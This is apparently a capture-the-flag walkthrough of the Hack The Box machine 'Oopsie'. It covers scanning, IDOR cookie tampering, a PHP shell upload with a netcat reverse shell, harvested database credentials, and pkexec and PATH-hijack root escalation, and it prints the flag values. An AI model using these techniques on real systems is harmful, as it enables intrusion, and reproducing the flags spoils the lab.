## Recon 

```
└─# nmap -sS -vvv -A --min-rate 5000 $ip
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxxctowbmnTyFHK0XREQShvlp32DNZ7TS9fp1pTxwt4urebfFSitu4cF2dgTlCyVI6o+bxVLuWvhbKqUNpl/9BCv/1DFEDmbbygvwwcONVx5BtcpO/4ubylZXmzWkC6neyGaQjmzVJFMeRTTUsNkcMgpkTJXSpcuNZTknnQu/SSUC5ZUNPdzgNkHcobGhHNoaJC2StrcFwvcg2ftx6b+wEap6jWbLId8UfJk0OFCHZWZI/SubDzjx3030ZCacC1Sb61/p4Cz9MvLL5qPYcEm8A14uU9pTUfDvhin1KAEEDCSCS3bnvtlw1V7SyF/tqtzPNsmdqG2wKXUb6PLyllU/L
|   256 241da417d4e32a9c905c30588f60778d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLaHbfbieD7gNSibdzPXBW7/NO05J48DoR4Riz65jUkMsMhI+m3mHjowOPQISgaB8VmT/kUggapZt/iksoOn2Ig=
|   256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLh0LONi0YmlZbqc960WnEcjI1XJTP8Li2KiUt5pmkk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome
OS fingerprint not ideal because: maxTimingRatio (1.754000e+00) is greater than 1.4
Aggressive OS guesses: Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), Linux 5.4 (94%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.6 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.1 (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%)
```
In the page i found : `admin@megacorp.com` then i change the domain in the htb
## Fuzz but nothing
The i look at the source code, in the debugger and found `cdn-cgi/login/`
I logged in as guest, and i found an IDOR on cookie. i will fire UP my burp.
I can upload file in `http://oopsie.htb/cdn-cgi/login/admin.php?content=uploads`
But they said only admin, i will replace IDOR cookie.
`http://oopsie.htb/cdn-cgi/login/admin.php?content=accounts&id=2` i modify the id=2 to id=1.
I used the inspect element to inspect and change cookies without cookie editor.
I will try to upload shell.
```The file shell.php has been uploaded.```
Now i will use gobuster to bruteforce directory and find uploads.
```
└─# ffuf -u "http://oopsie.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://oopsie.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 444ms]
                        [Status: 200, Size: 10932, Words: 1345, Lines: 479, Duration: 445ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 4042ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 4043ms]
css                     [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 343ms]
fonts                   [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 592ms]
images                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 375ms]
index.php               [Status: 200, Size: 10932, Words: 1345, Lines: 479, Duration: 355ms]
js                      [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 598ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 412ms]
themes                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 415ms]
uploads                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 425ms]
:: Progress: [4614/4614] :: Job [1/1] :: 91 req/sec :: Duration: [0:00:51] :: Errors: 0 ::
                                                                                             
```
So here i found uploads, i will try to find my shell and load it. 
when i visit here `http://oopsie.htb/uploads/` it's saying forbiden. i will try to load it directly
Now loaded
```
└─# nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.16.2] from (UNKNOWN) [10.129.95.191] 45522
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:54:39 up 43 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ www-data@oopsie:/home/robert$ cat user.txt
cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
www-data@oopsie:/home/robert$ 

```
## Privilege Escalation
Now i am connected on `www-data`, i will move to `/var/www/html` and try to find some sensitive db user or pass
```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```
On db user i found these user and pass, i will now connect on ssh.
On SUID i found
```
   264421     40 -rwsr-xr-x   1 root     root               37136 Mar 22  2019 /usr/bin/newuidmap
   264437     60 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /usr/bin/passwd
   264164     52 -rwsr-sr-x   1 daemon   daemon             51464 Feb 20  2018 /usr/bin/at
   264151     12 -rwsr-xr--   1 root     bugtracker          8792 Jan 25  2020 /usr/bin/bugtracker
   264420     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /usr/bin/newgrp
   264457     24 -rwsr-xr-x   1 root     root               22520 Mar 27  2019 /usr/bin/pkexec
   264215     76 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /usr/bin/chfn
   264217     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /usr/bin/chsh
   264598     20 -rwsr-xr-x   1 root     root               18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   264419     40 -rwsr-xr-x   1 root     root               37136 Mar 22  2019 /usr/bin/newgidmap
   264310     76 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /usr/bin/gpasswd
   262535    148 -rwsr-xr-x   1 root     root              149080 Jan 19  2021 /usr/bin/sudo

```
first i will exploit pkexec
```
# id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
# whoami
root
# cat /root/root.txt
af13b0bee69f8a877c3faf667f7beacf
```
Now i will look at other method.
I will exploit the `/usr/bin/bugtracker` SUID.
first i will create a file named `cat` and add `/bin/bash` on it
`chmod +x cat`
Then,
`export PATH=/tmp:$PATH`
Just run it
```
bugtracker
root@oopsie:/tmp# id;hostnamectl
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
   Static hostname: oopsie
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 30ac2a931f55413aac392af212029ea4
           Boot ID: d3093b78b7d443338bf2c079f5dadc7e
    Virtualization: vmware
  Operating System: Ubuntu 18.04.3 LTS
            Kernel: Linux 4.15.0-76-generic
      Architecture: x86-64

```